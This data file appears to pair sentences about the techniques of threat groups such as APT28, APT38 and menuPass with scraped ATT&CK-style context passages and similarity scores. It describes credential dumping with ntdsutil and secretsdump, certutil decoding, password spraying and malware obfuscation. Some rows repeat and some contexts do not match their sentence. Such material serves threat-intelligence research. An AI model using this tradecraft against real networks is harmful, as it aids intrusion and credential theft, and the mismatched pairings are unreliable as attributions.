"apt28 has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks.","[24]apt28has also used a kubernetes cluster to conduct distributed, large-scale password guessing attacks. [2].003password sprayingapt28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.","[24][31]apt28has also used a kubernetes cluster to conduct distributed, large-scale password spray attacks.",[2]enterpriset1059.001command and scripting interpreter:powershellapt28downloads and executes powershell scripts and performs powershell commands. [11][21][2].003command and scripting interpreter:windows command shellanapt28loader trojan uses a cmd.exe and batch script to run its payload.,66f57ea33063d29485700d48,2956,0.7932554745056912
apt28 uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,[44][3]they have also dumped the lsass process memory using the minidump function. [2].003ntdsapt28has used the ntdsutil.exe utility to export the active directory database for credential access.,[2]enterpriset1120peripheral device discoveryapt28uses a module to receive a notification every time a usb mass storage device is inserted into a victim.,[33]enterpriset1566.001phishing:spearphishing attachmentapt28sent spearphishing emails containing malicious microsoft office and rar attachments. [36][10][11][3][22][17][21][16].002phishing:spearphishing linkapt28sent spearphishing emails which used a url-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.,66f57ea33063d29485700d48,3010,0.7925687256457314
apt38 has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user.,"[1]enterpriset1565.001data manipulation:stored data manipulationapt38has used dyepack to create, delete, and alter records in databases used for swift transactions. [2].002data manipulation:transmitted data manipulationapt38has used dyepack to manipulate swift messages en route to a printer.",[2].003data manipulation:runtime data manipulationapt38has used dyepack.fox to manipulate pdf data as it is accessed to remove traces of fraudulent swift transactions from the data displayed to the end user.,[2]enterpriset1561.002disk wipe:disk structure wipeapt38has used a custom mbr wiper named bootwreck to render systems inoperable. [2]enterpriset1189drive-by compromiseapt38has conducted watering holes schemes to gain initial access to victims.,66f57e233063d29485700d12,1370,0.8317778953006573
apt38 has used task scheduler to run programs at system startup or on a scheduled basis for persistence.,"[1]enterpriset1057process discoveryapt38leveraged sysmon to understand the processes, services in the organization. [2]enterpriset1053.003scheduled task/job:cronapt38has used cron to create pre-scheduled and periodic background jobs on a linux system.",[1].005scheduled task/job:scheduled taskapt38has used task scheduler to run programs at system startup or on a scheduled basis for persistence.,"[1]enterpriset1505.003server software component:web shellapt38has used web shells for persistence or to ensure redundant access. [1]enterpriset1518.001software discovery:security software discoveryapt38has identified security software, configurations, defensive tools, and sensors installed on a compromised system.",66f57e233063d29485700d12,1390,0.7390085064292571
sodamaster can check for the presence of the registry key hkey_classes_root\\\\applications\\\\vmwarehostopen.exe before proceeding to its main functionality.,"a description of each command is shown in the following table.commanddescriptioncompilation time of sodamaster2019-01-072019-06-10dcreate thread for launching downloaded dll and call export function of the dll.enabledenabledfset value as rc4 key for the encrypted c2 communicationnot implementedenabledlset value as sleep timenot implementedenabledscreate thread for executing downloaded shellcodeenabledenabledbased on the analysis of the backdoor features of the sodamaster module, the purpose of this malware is also to download and execute payloads (dll or shellcode), like p8rat. unfortunately, we have not been able to obtain these payloads yet.the sodamaster module also shows an anti-vm feature.",the malware looks for the presence of the registry key “hkey_classes_root\\\\\\\\applications\\\\\\\\vmwarehostopen.exe” on the victim’s system before proceeding to its main functionality.,this registry key is specific to the vmware environment.sodamaster anti-vm checkanother characteristic of sodamaster is the use of a common obfuscation technique known as “stackstrings” to create the registry key in double-byte characters. we observed the same obfuscation technique used for a process name and dll name in other sodamaster samples.fyanti loader for quasarratthe last observed type of payload deployed by ecipekac is a loader module named fyanti loader.,66f57f323063d29485700d83,4599,0.8383427281050522
"apt38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.","[1]enterpriset1082system information discoveryapt38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs. [1]enterpriset1049system network connections discoveryapt38installed a port monitoring tool, mapmaker, to print the active tcp connections on the local system.","[2]enterpriset1033system owner/user discoveryapt38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.","[1]enterpriset1569.002system services:service executionapt38has created new services or modified existing ones to run executables, commands, or scripts. [1]enterpriset1529system shutdown/rebootapt38has used a custom mbr wiper named bootwreck, which will initiate a system reboot after wiping the victim's mbr.",66f57e233063d29485700d12,1397,0.8332415348272728
menupass has leveraged vulnerabilities in pulse secure vpns to hijack sessions.,the group has also usedcertutil -decodeto decode files on the victim’s machine when droppinguppercut. [9][10]enterpriset1568.001dynamic resolution:fast flux dnsmenupasshas used dynamic dns service providers to host malicious domains.,[2]enterpriset1190exploit public-facing applicationmenupasshas leveraged vulnerabilities in pulse secure vpns to hijack sessions.,"[14]enterpriset1210exploitation of remote servicesmenupasshas used tools to exploit the zerologon vulnerability (cve-2020-1472). [8]enterpriset1083file and directory discoverymenupasshas searched compromised systems for folders of interest including those related to hr, audit and expense, and meeting memos.",66f57fb93063d29485700dd8,2413,0.7063089722931041
"menupass has searched compromised systems for folders of interest including those related to hr, audit and expense, and meeting memos.",[2]enterpriset1190exploit public-facing applicationmenupasshas leveraged vulnerabilities in pulse secure vpns to hijack sessions. [14]enterpriset1210exploitation of remote servicesmenupasshas used tools to exploit the zerologon vulnerability (cve-2020-1472).,"[8]enterpriset1083file and directory discoverymenupasshas searched compromised systems for folders of interest including those related to hr, audit and expense, and meeting memos.",[8]enterpriset1574.001hijack execution flow:dll search order hijackingmenupasshas used dll search order hijacking. [6].002hijack execution flow:dll side-loadingmenupasshas used dll side-loading to launch versions of mimikatz and pwdump6 as well asuppercut.,66f57fb93063d29485700dd8,2415,0.8437807747302476
menupass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.,[12]enterpriset1003.002os credential dumping:security account managermenupasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials. [12][13].003os credential dumping:ntdsmenupasshas used ntdsutil to dump credentials.,[8].004os credential dumping:lsa secretsmenupasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.,[12][13]enterpriset1566.001phishing:spearphishing attachmentmenupasshas sent malicious office documents via email as part of spearphishing campaigns as well as executables disguised as documents. [12][7][10][2]enterpriset1055.012process injection:process hollowingmenupasshas used process hollowing in iexplore.exe to load theredleavesimplant.,66f57fb93063d29485700dd8,2431,0.7244733352619136
"menupass has attempted to get victims to open malicious files such as windows shortcuts  and/or microsoft office documents, sent via email as part of spearphishing campaigns.",[12]enterpriset1049system network connections discoverymenupasshas usednet useto conduct connectivity checks to machines. [6]enterpriset1199trusted relationshipmenupasshas used legitimate access granted to managed service providers in order to access victims of interest.,"[12][7][8][1][2]enterpriset1204.002user execution:malicious filemenupasshas attempted to get victims to open malicious files such as windows shortcuts (.lnk) and/or microsoft office documents, sent via email as part of spearphishing campaigns.","[12][7][9][10][2]enterpriset1078valid accountsmenupasshas used valid accounts including shared between managed service providers and clients to move between the two environments. [6][8][2][14]enterpriset1047windows management instrumentationmenupasshas used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using wmi.",66f57fb93063d29485700dd8,2444,0.7355815517706092
"menupass has encoded strings in its malware with base64 as well as with a simple, single-byte xor obfuscation using key 0x40.","[2]enterpriset1106native apimenupasshas used native apis includinggetmodulefilename,lstrcat,createfile, andreadfile. [8]enterpriset1046network service discoverymenupasshas used tcping.exe, similar toping, to probe port status on systems of interest.","[12]enterpriset1027.013obfuscated files or information:encrypted/encoded filemenupasshas encoded strings in its malware with base64 as well as with a simple, single-byte xor obfuscation using key 0x40.","[9][10][8]enterpriset1588.002obtain capabilities:toolmenupasshas used and modified open-source tools likeimpacket,mimikatz, andpwdump. [12]enterpriset1003.002os credential dumping:security account managermenupasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",66f57fb93063d29485700dd8,2427,0.7240818968034151
menupass has staged data on remote msp systems or other victim networks prior to exfiltration.,"[1][8]enterpriset1039data from network shared drivemenupasshas collected data from remote systems by mounting network shares withnet useand using robocopy to transfer data. [6]enterpriset1074.001data staged:local data stagingmenupassstages data prior to exfiltration in multi-part archives, often saved in the recycle bin.",[6].002data staged:remote data stagingmenupasshas staged data on remote msp systems or other victim networks prior to exfiltration.,[6][8]enterpriset1140deobfuscate/decode files or informationmenupasshas usedcertutilin a macro to decode base64-encoded content contained in a dropper document attached to an email. the group has also usedcertutil -decodeto decode files on the victim’s machine when droppinguppercut.,66f57fb93063d29485700dd8,2409,0.7560397460288989
menupass has sent malicious office documents via email as part of spearphishing campaigns as well as executables disguised as documents.,[12][13].003os credential dumping:ntdsmenupasshas used ntdsutil to dump credentials. [8].004os credential dumping:lsa secretsmenupasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.,[12][13]enterpriset1566.001phishing:spearphishing attachmentmenupasshas sent malicious office documents via email as part of spearphishing campaigns as well as executables disguised as documents.,[12][7][10][2]enterpriset1055.012process injection:process hollowingmenupasshas used process hollowing in iexplore.exe to load theredleavesimplant. [9]enterpriset1090.002proxy:external proxymenupasshas used a global service provider's ip as a proxy for c2 traffic from a victim.,66f57fb93063d29485700dd8,2432,0.74378035171163
menupass has used several tools to scan for open netbios nameservers and enumerate netbios sessions.,[12]enterpriset1553.002subvert trust controls:code signingmenupasshas resized and added data to the certificate table to enable the signing of modified files with legitimate signatures. [14]enterpriset1218.004system binary proxy execution:installutilmenupasshas usedinstallutil.exeto execute malicious software.,[12]enterpriset1016system network configuration discoverymenupasshas used several tools to scan for open netbios nameservers and enumerate netbios sessions.,[12]enterpriset1049system network connections discoverymenupasshas usednet useto conduct connectivity checks to machines. [6]enterpriset1199trusted relationshipmenupasshas used legitimate access granted to managed service providers in order to access victims of interest.,66f57fb93063d29485700dd8,2441,0.7737809061323925
menupass has used legitimate access granted to managed service providers in order to access victims of interest.,[12]enterpriset1016system network configuration discoverymenupasshas used several tools to scan for open netbios nameservers and enumerate netbios sessions. [12]enterpriset1049system network connections discoverymenupasshas usednet useto conduct connectivity checks to machines.,[6]enterpriset1199trusted relationshipmenupasshas used legitimate access granted to managed service providers in order to access victims of interest.,"[12][7][8][1][2]enterpriset1204.002user execution:malicious filemenupasshas attempted to get victims to open malicious files such as windows shortcuts (.lnk) and/or microsoft office documents, sent via email as part of spearphishing campaigns. [12][7][9][10][2]enterpriset1078valid accountsmenupasshas used valid accounts including shared between managed service providers and clients to move between the two environments.",66f57fb93063d29485700dd8,2443,0.7574511510079833
menupass has used valid accounts including shared between managed service providers and clients to move between the two environments.,"[6]enterpriset1199trusted relationshipmenupasshas used legitimate access granted to managed service providers in order to access victims of interest. [12][7][8][1][2]enterpriset1204.002user execution:malicious filemenupasshas attempted to get victims to open malicious files such as windows shortcuts (.lnk) and/or microsoft office documents, sent via email as part of spearphishing campaigns.",[12][7][9][10][2]enterpriset1078valid accountsmenupasshas used valid accounts including shared between managed service providers and clients to move between the two environments.,"[6][8][2][14]enterpriset1047windows management instrumentationmenupasshas used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using wmi. [12][13][8]",66f57fb93063d29485700dd8,2445,0.7661723266525955
the group has used a modified version of pentesting script wmiexec.vbs to execute commands.,[8]enterpriset1059.001command and scripting interpreter:powershellmenupassusespowersploitto inject shellcode into powershell. [12][8].003command and scripting interpreter:windows command shellmenupassexecutes commands using a command-line interface and reverse shell.,the group has used a modified version of pentesting script wmiexec.vbs to execute commands.,[6][12][13][10]menupasshas used malicious macros embedded inside office documents to execute files. [9][10]enterpriset1005data from local systemmenupasshas collected various files from the compromised computers.,66f57fb93063d29485700dd8,2404,1.0
"menupass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using wmi.","[12][7][8][1][2]enterpriset1204.002user execution:malicious filemenupasshas attempted to get victims to open malicious files such as windows shortcuts (.lnk) and/or microsoft office documents, sent via email as part of spearphishing campaigns. [12][7][9][10][2]enterpriset1078valid accountsmenupasshas used valid accounts including shared between managed service providers and clients to move between the two environments.","[6][8][2][14]enterpriset1047windows management instrumentationmenupasshas used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using wmi.",[12][13][8] overviewcisco talos has been tracking a new version of smoke loader — a malicious application that can be used to load other malware — for the past several months following an alert from cisco advanced malware protection’s (amp) exploit prevention engine.,66f57fb93063d29485700dd8,2446,0.7325392957541473
"menupass has encoded strings in its malware with base64 as well as with a simple, single-byte xor obfuscation using key 0x40.","[2]enterpriset1106native apimenupasshas used native apis includinggetmodulefilename,lstrcat,createfile, andreadfile. [8]enterpriset1046network service discoverymenupasshas used tcping.exe, similar toping, to probe port status on systems of interest.","[12]enterpriset1027.013obfuscated files or information:encrypted/encoded filemenupasshas encoded strings in its malware with base64 as well as with a simple, single-byte xor obfuscation using key 0x40.","[9][10][8]enterpriset1588.002obtain capabilities:toolmenupasshas used and modified open-source tools likeimpacket,mimikatz, andpwdump. [12]enterpriset1003.002os credential dumping:security account managermenupasshas used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",66f57fb93063d29485700dd8,2427,0.7240818968034151
menupass has staged data on remote msp systems or other victim networks prior to exfiltration.,"[1][8]enterpriset1039data from network shared drivemenupasshas collected data from remote systems by mounting network shares withnet useand using robocopy to transfer data. [6]enterpriset1074.001data staged:local data stagingmenupassstages data prior to exfiltration in multi-part archives, often saved in the recycle bin.",[6].002data staged:remote data stagingmenupasshas staged data on remote msp systems or other victim networks prior to exfiltration.,[6][8]enterpriset1140deobfuscate/decode files or informationmenupasshas usedcertutilin a macro to decode base64-encoded content contained in a dropper document attached to an email. the group has also usedcertutil -decodeto decode files on the victim’s machine when droppinguppercut.,66f57fb93063d29485700dd8,2409,0.7560397460288989
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","this vulnerability allowed the attackers to collect clear-text credentials from the sessions file on vulnerable fortinet vpn appliances. the actors collected credentials from over 900 fortinet vpn servers in the united states, europe, and israel so far this year.","in the last half of 2021, phosphorus shifted to scanning for unpatched on-premises exchange servers vulnerable to proxyshell (cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065).exploitwhen they identified vulnerable servers, phosphorus sought to gain persistence on the target systems.","in some instances, the actors downloaded a plink runner namedmicrosoftoutlookupdater.exe. this file would beacon periodically to their c2 servers via ssh, allowing the actors to issue further commands.",66f582bf3063d29485700f5b,1777,0.707265101451176
